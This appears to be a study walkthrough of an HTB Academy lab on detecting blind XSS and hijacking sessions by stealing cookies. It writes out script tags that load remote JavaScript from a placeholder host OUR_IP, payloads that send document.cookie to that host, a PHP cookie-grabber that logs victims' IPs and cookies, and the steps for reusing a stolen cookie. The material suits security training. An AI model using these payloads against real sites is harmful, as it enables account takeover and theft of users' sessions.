If a malicious user obtains the cookie data from the victims browser, he might be able to gain access to the user's login session.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

This is a walkthrough from  [HTB Academy](https://academy.hackthebox.com/module/103/section/1008)

## Blind XSS Detection

A blind XSS vulnerability occurs when the vulnerability is being triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

When we submit the following form:
![[xss_blind_test_form.jpg]]

We can see we get the following message:
![[xss_blind_test_form_output.jpg]]

We don't have access to the admin panel in this case, so we can test it locally (i.e. until we get an alert box).

For detection we can use a JavaScript payload that sends an HTTP request back to our server. If it's executed, we will get a response, and we will know that the page is vulnerable.

1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?

## Loading a Remote Script

We can include a remote script in the `<scrip>` tag:
```html
<script src="http://OUR_IP/script.js"></script>
```

We can use the name of the script as the name of the field we are texting, for easier tracking:
```html
<script src="http://OUR_IP/username"></script>
```

If we get a request to a specific file, we know that this field is vulnerable to XSS. Here are a few example we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

With access to the source code, it would be possible to precisely write the required payload. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerability.

We will now start a PHP listener:
```shell-session
$ sudo php -S 0.0.0.0:80
```

Now we can try those payloads in the appropriate fields:
```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

Once we receive a call to our sever, we will not the last XSS payload we used as a working payload, and note the vulnerable input field name.

## Session Hijacking

Session hijacking requires a JavaScript payload to send us data, and a PHP script hosted on our server to grab and parse the transmitted data.

There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

The first payload navigates to our cookie grabber PHP page, which may look suspicious. The second payload simply adds an image to the page.

We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Now, we can change the URL in the XSS payload we found earlier to use `script.js`:
```html
<script src=http://OUR_IP/script.js></script>
```

If there are many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

We can save the following PHP script as `index.php`, and re-run the PHP server again:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Once the user visits the page, we will get one request for `script.js`, which in turn will make another request with the cookie value:
```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

We can check the `cookies.txt` file:
```shell-session
$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Now we can use the cookie in the login page, and refresh the page to get access to the session.

